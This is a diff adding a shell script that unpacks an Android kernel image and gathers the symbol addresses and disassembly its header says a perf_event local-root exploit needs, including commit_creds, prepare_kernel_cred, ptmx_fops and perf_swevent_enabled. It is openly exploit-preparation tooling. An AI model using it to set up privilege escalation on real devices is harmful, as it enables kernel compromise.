@@ -1,0 +1,91 @@
+#!/bin/sh
+#
+# Author: DooMLoRD@XDA
+#
+# Script to extract and search for required address for perf_event exploit
+#
+# Usage:
+#  extract_address_and_disassemble zImage
+#
+# Output:
+#  addresses.txt - this will contain the 5 crucial addresses from the kallsyms
+#  kernel.dasm   - this will contain the disassembelled kernel
+#
+
+# Update path to toolchain
+echo "Searching for zImage compression"
+
+# following is only for kernels packed with XZ compression
+LOC1=`grep -P -a -b -m 1 --only-matching '\xfd7zXZ\x00' $1 | tail -1 | cut -d: -f 1`
+if [ $LOC1 ]
+then
+	echo "XZ compression detected"
+	echo "Unpacking zImage"
+	dd if=$1 bs=$LOC1 skip=1 | xz -dc > kernel.Image
+else
+
+	# following is only for kernels packed with LZO compression
+	LOC1=`grep -P -a -b --only-matching '\x89LZO\x00' $1 | tail -1 | cut -d: -f 1`
+	if [ $LOC1 ]
+	then
+		echo "LZO compression detected"
+		echo "Unpacking zImage"
+		dd if=$1 bs=$LOC1 skip=1 | lzop -do kernel.Image
+	else
+		# following is only for kernels packed with LZ4 compression
+		LOC1=`grep -P -a -b --only-matching '\x02\x21\x4c\x18' $1 | tail -1 | cut -d: -f 1`
+		if [ $LOC1 ]
+		then
+			echo "LZ4 compression detected"
+			echo "Unpacking zImage"
+			dd if=$1 bs=$LOC1 skip=1 | lz4 -d > kernel.Image
+		else
+			# following is only for kernels packed with GZ compression
+			LOC1=`grep -P -a -b -m 1 --only-matching '\x1f\x8b\x08' $1 | tail -1 | cut -d: -f 1`
+			if [ $LOC1 ]
+			then
+				echo "GZ compression detected"
+				echo "Unpacking zImage"
+				dd if=$1 bs=$LOC1 skip=1 | gzip -dc > kernel.Image
+			else
+				echo "Unsupported compression!"
+			fi
+		fi
+
+	fi
+
+fi
+
+LOC=$LOC1
+if [ $LOC ]
+then
+	if [ -e kernel.Image ]
+	then
+		echo "DONE unpacking zImage"
+		echo "Grabbing addresses"
+		~/android/scripts/kallsymsprint.x86 kernel.Image > kallsyms.txt
+
+		cat kallsyms.txt | grep " prepare_kernel_cred" >> addresses.txt
+		cat kallsyms.txt | grep " commit_creds" >> addresses.txt
+		cat kallsyms.txt | grep " remap_pfn_range" >> addresses.txt
+		cat kallsyms.txt | grep " vmalloc_exec" >> addresses.txt
+
+		echo "Disassembling kernel for specific functions"
+		~/android/scripts/arm7-dasm kernel.Image c0008000 pty_init kallsyms.txt > pty_init.dasm
+		~/android/scripts/arm7-dasm kernel.Image c0008000 unix98_pty_init kallsyms.txt >> pty_init.dasm
+		~/android/scripts/arm7-dasm kernel.Image c0008000 sw_perf_event_destroy kallsyms.txt > sw_perf_event_destroy.dasm
+
+		echo "searching for ptmx_fops"
+		ADDR_PTMX_FOPS=`~/android/scripts/get-ptmx_fops pty_init.dasm`
+		echo "$ADDR_PTMX_FOPS = (hexdec addition)    ptmx_fops"  >> addresses.txt
+
+		echo "searching for perf_swevent_enabled"
+		ADDR_SWPREF=`~/android/scripts/get-perf_swevent_enabled sw_perf_event_destroy.dasm`
+		echo "$ADDR_SWPREF perf_swevent_enabled"  >> addresses.txt
+
+	else
+		echo "ERROR! unpacking zImage"
+	fi
+else
+	echo "ERROR! zImage has different compression"
+fi
